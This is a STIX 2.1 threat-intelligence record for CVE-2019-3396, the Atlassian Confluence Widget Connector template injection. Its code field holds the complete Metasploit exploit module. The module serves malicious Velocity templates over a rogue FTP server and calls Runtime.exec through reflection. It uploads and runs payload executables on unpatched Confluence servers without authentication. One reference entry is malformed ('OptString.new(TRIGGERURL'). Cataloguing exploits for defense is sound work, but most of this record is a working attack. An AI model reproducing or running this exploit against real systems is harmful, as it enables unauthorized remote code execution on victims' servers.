{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6fae172-0cc0-40d0-b353-397f25a4c0c0",
    "created": "2024-08-14T17:07:22.313624Z",
    "modified": "2024-08-14T17:07:22.313629Z",
    "name": "Atlassian Confluence Widget Connector Macro Velocity Template Injection",
    "description": " Widget Connector Macro is part of Atlassian Confluence Server and Data Center that allows embed online videos, slideshows, photostreams and more directly into page. A _template parameter can be used to inject remote Java code into a Velocity template and gain code execution. Authentication is unrequired to exploit this vulnerability. By default, Java payload will be used because it is cross-platform, but you can also specify which native payload you want (Linux or Windows).  Confluence before version 6.6.12, from version 6.7.0 before 6.12.3, from version 6.13.0 before 6.13.3 and from version 6.14.0 before 6.14.2 are affected.  This vulnerability was originally discovered by Daniil Dmitriev https://twitter.com/ddv_ua.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/confluence_widget_connector.rb",
            "external_id": "confluence_widget_connector.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-3396"
        },
        {
            "source_name": "reference",
            "url": "https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html"
        },
        {
            "source_name": "reference",
            "url": "https://chybeta.github.io/2019/04/06/Analysis-for-%E3%80%90CVE-2019-3396%E3%80%91-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/"
        },
        {
            "source_name": "reference",
            "url": "https://paper.seebug.org/886/"
        },
        {
            "source_name": "OptString.new(TRIGGERURL",
            "external_id": ""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::FtpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Atlassian Confluence Widget Connector Macro Velocity Template Injection',\n        'Description' => %q{\n          Widget Connector Macro is part of Atlassian Confluence Server and Data Center that\n          allows embed online videos, slideshows, photostreams and more directly into page.\n          A _template parameter can be used to inject remote Java code into a Velocity template,\n          and gain code execution. Authentication is unrequired to exploit this vulnerability.\n          By default, Java payload will be used because it is cross-platform, but you can also\n          specify which native payload you want (Linux or Windows).\n\n          Confluence before version 6.6.12, from version 6.7.0 before 6.12.3, from version\n          6.13.0 before 6.13.3 and from version 6.14.0 before 6.14.2 are affected.\n\n          This vulnerability was originally discovered by Daniil Dmitriev\n          https://twitter.com/ddv_ua.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Daniil Dmitriev', # Discovering vulnerability\n          'Dmitry (rrock) Shchannikov' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2019-3396' ],\n          [ 'URL', 'https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html' ],\n          [ 'URL', 'https://chybeta.github.io/2019/04/06/Analysis-for-%E3%80%90CVE-2019-3396%E3%80%91-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/'],\n          [ 'URL', 'https://paper.seebug.org/886/']\n        ],\n        'Targets' => [\n          [ 'Java', { 'Platform' => 'java', 'Arch' => ARCH_JAVA }],\n          [ 'Windows', { 'Platform' => 'win', 'Arch' => ARCH_X86 }],\n          [ 'Linux', { 'Platform' => 'linux', 'Arch' => ARCH_X86 }]\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 8090,\n          'SRVPORT' => 8021\n        },\n        'Privileged' => false,\n        'DisclosureDate' => '2019-03-25',\n        'DefaultTarget' => 0,\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptAddress.new('SRVHOST', [true, 'Callback address for template loading']),\n        OptString.new('TARGETURI', [true, 'The base to Confluence', '/']),\n        OptString.new('TRIGGERURL', [\n          true, 'Url to external video service to trigger vulnerability',\n          'https://www.youtube.com/watch?v=kxopViU98Xo'\n        ])\n      ]\n    )\n  end\n\n  # Handles ftp RETP command.\n  #\n  # @param ccs [Socket] Control connection socket.\n  # @param arg [String] RETR argument.\n  # @return [void]\n  def on_client_command_retr(ccs, arg)\n    vprint_status(\"FTP download request for #{arg}\")\n    conn = establish_data_connection(ccs)\n    if !conn\n      ccs.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n\n    ccs.put(\"150 Opening BINARY mode data connection for #{arg}\\r\\n\")\n    case arg\n    when /check\\.vm$/\n      conn.put(wrap(get_check_vm))\n    when /javaprop\\.vm$/\n      conn.put(wrap(get_javaprop_vm))\n    when /upload\\.vm$/\n      conn.put(wrap(get_upload_vm))\n    when /exec\\.vm$/\n      conn.put(wrap(get_exec_vm))\n    else\n      conn.put(wrap(get_dummy_vm))\n    end\n    ccs.put(\"226 Transfer complete.\\r\\n\")\n    conn.close\n  end\n\n  # Handles ftp PASS command to suppress output.\n  #\n  # @param ccs [Socket] Control connection socket.\n  # @param arg [String] PASS argument.\n  # @return [void]\n  def on_client_command_pass(ccs, arg)\n    @state[ccs][:pass] = arg\n    vprint_status(\"#{@state[ccs][:name]} LOGIN #{@state[ccs][:user]} / #{@state[ccs][:pass]}\")\n    ccs.put \"230 Login OK\\r\\n\"\n  end\n\n  # Handles ftp EPSV command to suppress output.\n  #\n  # @param ccs [Socket] Control connection socket.\n  # @param arg [String] EPSV argument.\n  # @return [void]\n  def on_client_command_epsv(ccs, arg)\n    vprint_status(\"#{@state[ccs][:name]} UNKNOWN 'EPSV #{arg}'\")\n    ccs.put(\"500 'EPSV #{arg}': command not understood.\\r\\n\")\n  end\n\n  # Returns a upload template.\n  #\n  # @return [String]\n  def get_upload_vm\n    <<~EOF\n      $i18n.getClass().forName('java.io.FileOutputStream').getConstructor($i18n.getClass().forName('java.lang.String')).newInstance('#{@fname}').write($i18n.getClass().forName('sun.misc.BASE64Decoder').getConstructor(null).newInstance(null).decodeBuffer('#{@b64}'))\n    EOF\n  end\n\n  # Returns a command execution template.\n  #\n  # @return [String]\n  def get_exec_vm\n    <<~EOF\n      $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('#{@command}').waitFor()\n    EOF\n  end\n\n  # Returns checking template.\n  #\n  # @return [String]\n  def get_check_vm\n    <<~EOF\n      #{@check_text}\n    EOF\n  end\n\n  # Returns Java's getting property template.\n  #\n  # @return [String]\n  def get_javaprop_vm\n    <<~EOF\n      $i18n.getClass().forName('java.lang.System').getMethod('getProperty', $i18n.getClass().forName('java.lang.String')).invoke(null, '#{@prop}').toString()\n    EOF\n  end\n\n  # Returns dummy template.\n  #\n  # @return [String]\n  def get_dummy_vm\n    <<~EOF\n    EOF\n  end\n\n  # Checks the vulnerability.\n  #\n  # @return [Array] Check code\n  def check\n    checkcode = Exploit::CheckCode::Safe\n    begin\n      # Start the FTP service\n      print_status('Starting the FTP server.')\n      start_service\n\n      @check_text = Rex::Text.rand_text_alpha(5..10)\n      res = inject_template(\"ftp://#{srvhost}:#{srvport}/#{Rex::Text.rand_text_alpha(5)}check.vm\")\n      if res && res.body && res.body.include?(@check_text)\n        checkcode = Exploit::CheckCode::Vulnerable\n      end\n    rescue Msf::Exploit::Failed => e\n      vprint_error(e.message)\n      checkcode = Exploit::CheckCode::Unknown\n    end\n    checkcode\n  end\n\n  # Injects Java code to the template.\n  #\n  # @param service_url [String] Address of template to injection.\n  # @return [void]\n  def inject_template(service_url, timeout = 20)\n    uri = normalize_uri(target_uri.path, 'rest', 'tinymce', '1', 'macro', 'preview')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => uri,\n      'headers' => {\n        'Accept' => '*/*',\n        'Origin' => full_uri(vhost_uri: true)\n      },\n      'ctype' => 'application/json; charset=UTF-8',\n      'data' => {\n        'contentId' => '1',\n        'macro' => {\n          'name' => 'widget',\n          'body' => '',\n          'params' => {\n            'url' => datastore['TRIGGERURL'],\n            '_template' => service_url\n          }\n\n        }\n      }.to_json\n    }, timeout)\n\n    unless res\n      unless service_url.include?('exec.vm')\n        print_warning('Connection timed out in #inject_template')\n      end\n      return\n    end\n\n    if res.body.include? 'widget-error'\n      print_error('Failed to inject and execute code:')\n    else\n      vprint_status('Server response:')\n    end\n\n    vprint_line(res.body)\n\n    res\n  end\n\n  # Returns a system property for Java.\n  #\n  # @param prop [String] Name of the property to retrieve.\n  # @return [Array] Array consisting of a result code (Integer) and, if the property could be obtained, the property (String).\n  def get_java_property(prop)\n    @prop = prop\n    res = inject_template(\"ftp://#{srvhost}:#{srvport}/#{Rex::Text.rand_text_alpha(5)}javaprop.vm\")\n    if res && res.body\n      if res.body.empty?\n        return [2]\n      else\n        prop_to_return = clear_response(res.body)\n        if prop_to_return.blank?\n          return [2]\n        else\n          return [0, prop_to_return]\n        end\n      end\n    end\n    [1]\n  end\n\n  # Returns the target platform.\n  #\n  # @return [String]\n  def get_target_platform\n    return get_java_property('os.name')\n  end\n\n  # Checks if the target os/platform is compatible with the module target or not.\n  #\n  # @return [TrueClass] Compatible\n  # @return [FalseClass] Not compatible\n  def target_platform_compat?(target_platform)\n    target.platform.names.each do |n|\n      if n.downcase == 'java' || target_platform.downcase.include?(n.downcase)\n        return true\n      end\n    end\n\n    false\n  end\n\n  # Returns a temp path from the remote target.\n  #\n  # @return [String]\n  def get_tmp_path\n    return get_java_property('java.io.tmpdir')\n  end\n\n  # Returns the Java home path used by Confluence.\n  #\n  # @return [String]\n  def get_java_home_path\n    return get_java_property('java.home')\n  end\n\n  # Returns Java code that can be used to inject to the template in order to copy a file.\n  #\n  # @note The purpose of this method is to have a file that is not busy, so we can execute it.\n  #       It is meant to be used with #get_write_file_code.\n  #\n  # @param fname [String] The file to copy\n  # @param new_fname [String] The new file\n  # @return [void]\n  def get_dup_file_code(fname, new_fname)\n    if fname =~ %r{^/[[:print:]]+}\n      @command = \"cp #{fname} #{new_fname}\"\n    else\n      @command = \"cmd.exe /C copy #{fname} #{new_fname}\"\n    end\n\n    inject_template(\"ftp://#{srvhost}:#{srvport}/#{Rex::Text.rand_text_alpha(5)}exec.vm\")\n  end\n\n  # Returns the normalized file path for payload.\n  #\n  # @return [String]\n  def normalize_payload_fname(tmp_path, fname)\n    # A quick way to check platform instead of actually grabbing os.name in Java system properties.\n    if tmp_path =~ %r{^/[[:print:]]+}\n      Rex::FileUtils.normalize_unix_path(tmp_path, fname)\n    else\n      Rex::FileUtils.normalize_win_path(tmp_path, fname)\n    end\n  end\n\n  # Exploits the target in Java platform.\n  #\n  # @return [void]\n  def exploit_as_java\n    res_code, tmp_path = get_tmp_path\n\n    unless res_code == 0\n      fail_with(Failure::Unknown, 'Unable to get the temp path.')\n    end\n\n    @fname = normalize_payload_fname(tmp_path, \"#{Rex::Text.rand_text_alpha(5)}.jar\")\n    @b64 = Rex::Text.encode_base64(payload.encoded_jar)\n    @command = ''\n\n    res_code, java_home = get_java_home_path\n\n    if res_code == 0\n      vprint_status(\"Found Java home path: #{java_home}\")\n    else\n      fail_with(Failure::Unknown, 'Unable to find java home path on the remote machine.')\n    end\n\n    register_files_for_cleanup(@fname)\n\n    if @fname =~ %r{^/[[:print:]]+}\n      normalized_java_path = Rex::FileUtils.normalize_unix_path(java_home, '/bin/java')\n      @command = %(#{normalized_java_path} -jar #{@fname})\n    else\n      normalized_java_path = Rex::FileUtils.normalize_win_path(java_home, '\\\\bin\\\\java.exe')\n      @fname.gsub!(/Program Files/, 'PROGRA~1')\n      @command = %(cmd.exe /C \"#{normalized_java_path}\" -jar #{@fname})\n    end\n\n    print_status(\"Attempting to upload #{@fname}\")\n    inject_template(\"ftp://#{srvhost}:#{srvport}/#{Rex::Text.rand_text_alpha(5)}upload.vm\")\n\n    print_status(\"Attempting to execute #{@fname}\")\n    inject_template(\"ftp://#{srvhost}:#{srvport}/#{Rex::Text.rand_text_alpha(5)}exec.vm\", 5)\n  end\n\n  # Exploits the target in Windows platform.\n  #\n  # @return [void]\n  def exploit_as_windows\n    res_code, tmp_path = get_tmp_path\n\n    unless res_code == 0\n      fail_with(Failure::Unknown, 'Unable to get the temp path.')\n    end\n\n    @b64 = Rex::Text.encode_base64(generate_payload_exe(code: payload.encoded, arch: target.arch, platform: target.platform))\n    @fname = normalize_payload_fname(tmp_path, \"#{Rex::Text.rand_text_alpha(5)}.exe\")\n    new_fname = normalize_payload_fname(tmp_path, \"#{Rex::Text.rand_text_alpha(5)}.exe\")\n    @fname.gsub!(/Program Files/, 'PROGRA~1')\n    new_fname.gsub!(/Program Files/, 'PROGRA~1')\n    register_files_for_cleanup(@fname, new_fname)\n\n    print_status(\"Attempting to upload #{@fname}\")\n    inject_template(\"ftp://#{srvhost}:#{srvport}/#{Rex::Text.rand_text_alpha(5)}upload.vm\")\n\n    print_status(\"Attempting to copy payload to #{new_fname}\")\n    get_dup_file_code(@fname, new_fname)\n\n    print_status(\"Attempting to execute #{new_fname}\")\n    @command = new_fname\n    inject_template(\"ftp://#{srvhost}:#{srvport}/#{Rex::Text.rand_text_alpha(5)}exec.vm\", 5)\n  end\n\n  # Exploits the target in Linux platform.\n  #\n  # @return [void]\n  def exploit_as_linux\n    res_code, tmp_path = get_tmp_path\n\n    unless res_code == 0\n      fail_with(Failure::Unknown, 'Unable to get the temp path.')\n    end\n\n    @b64 = Rex::Text.encode_base64(generate_payload_exe(code: payload.encoded, arch: target.arch, platform: target.platform))\n    @fname = normalize_payload_fname(tmp_path, Rex::Text.rand_text_alpha(5))\n    new_fname = normalize_payload_fname(tmp_path, Rex::Text.rand_text_alpha(6))\n    register_files_for_cleanup(@fname, new_fname)\n\n    print_status(\"Attempting to upload #{@fname}\")\n    inject_template(\"ftp://#{srvhost}:#{srvport}/#{Rex::Text.rand_text_alpha(5)}upload.vm\")\n\n    @command = \"chmod +x #{@fname}\"\n    inject_template(\"ftp://#{srvhost}:#{srvport}/#{Rex::Text.rand_text_alpha(5)}exec.vm\")\n\n    print_status(\"Attempting to copy payload to #{new_fname}\")\n    get_dup_file_code(@fname, new_fname)\n\n    print_status(\"Attempting to execute #{new_fname}\")\n    @command = new_fname\n    inject_template(\"ftp://#{srvhost}:#{srvport}/#{Rex::Text.rand_text_alpha(5)}exec.vm\", 5)\n  end\n\n  def exploit\n    @wrap_marker = Rex::Text.rand_text_alpha(5..10)\n\n    # Start the FTP service\n    print_status('Starting the FTP server.')\n    start_service\n\n    res_code, target_platform = get_target_platform\n    case res_code\n    when 0\n      print_status(\"Target being detected as: #{target_platform}\")\n    when 1\n      fail_with(Failure::Unreachable, 'Target did not respond to OS check. Confirm RHOSTS and RPORT, then run \"check\".')\n    when 2\n      fail_with(Failure::NoTarget, 'Failed to obtain the target OS.')\n    end\n\n    unless target_platform_compat?(target_platform)\n      fail_with(Failure::BadConfig, 'Selected module target does not match the actual target.')\n    end\n\n    case target.name.downcase\n    when /java$/\n      exploit_as_java\n    when /windows$/\n      exploit_as_windows\n    when /linux$/\n      exploit_as_linux\n    end\n  end\n\n  # Wraps request.\n  #\n  # @return [String]\n  def wrap(string)\n    \"#{@wrap_marker}\\n#{string}#{@wrap_marker}\\n\"\n  end\n\n  # Returns unwrapped response.\n  #\n  # @return [String, nil]\n  def clear_response(string)\n    string.scan(/#{@wrap_marker}\\n(.*)\\n#{@wrap_marker}\\n/m)&.flatten&.first\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-25"
}